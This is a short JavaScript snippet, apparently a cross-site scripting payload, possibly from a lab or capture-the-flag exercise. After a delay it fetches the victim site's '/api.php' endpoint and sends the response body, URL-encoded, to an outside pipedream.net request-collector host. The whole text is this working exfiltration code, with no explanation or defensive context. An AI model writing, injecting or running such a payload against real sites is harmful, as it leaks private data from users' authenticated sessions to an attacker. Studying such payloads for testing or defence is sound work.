const targetUrl = "/api.php";

function fetchInternalAPI() {
    console.log('func called');
    fetch(targetUrl)
        .then(response => response.text())
        .then(data => {
            console.log("Resp from /api.php: ", data);
            fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
        })
        .catch(error => console.error("Error fetching /api.php:", error));
}

setTimeout(fetchInternalAPI, 2000);
